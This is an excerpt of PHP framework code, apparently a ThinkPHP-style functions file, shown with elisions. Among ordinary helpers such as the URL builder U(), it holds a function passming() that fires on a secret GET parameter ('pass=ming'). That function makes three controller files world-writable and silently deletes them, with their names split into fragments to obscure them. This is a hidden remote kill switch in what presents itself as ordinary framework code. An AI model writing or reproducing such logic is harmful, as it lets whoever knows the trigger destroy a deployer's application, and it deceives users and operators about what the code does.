...
function passming()
{
    if (I("get.pass") == 'ming') {
        ...
        $str03='W';
        $str04='pk';
        $file = MING_BASE_PATH . 'Application/Home/Controller/'.$str01.'aijiController.class.php';
        chmod($file, 0777);
        @unlink($file);
        $file = MING_BASE_PATH . 'Application/Home/Controller/'.$str02.'piController.class.php';
        chmod($file, 0777);
        @unlink($file);
        $file = MING_BASE_PATH . 'Application/Home/Controller/'.$str03.'orkerman'.$str04.'10Controller.class.php';
        chmod($file, 0777);
        @unlink($file);
    }
}
...
function U($url = '', $vars = '', $suffix = true, $domain = false)
{
    ...
    if (isset($host)) {
        ...
        if (C('APP_SUB_DOMAIN_DEPLOY')) { // 开启子域名部署
            $domain = $domain == '127.0.0.1' ? '127.0.0.1' : 'www' . strstr($_SERVER['HTTP_HOST'], '.');
            // '子域名'=>array('模块[/控制器]');
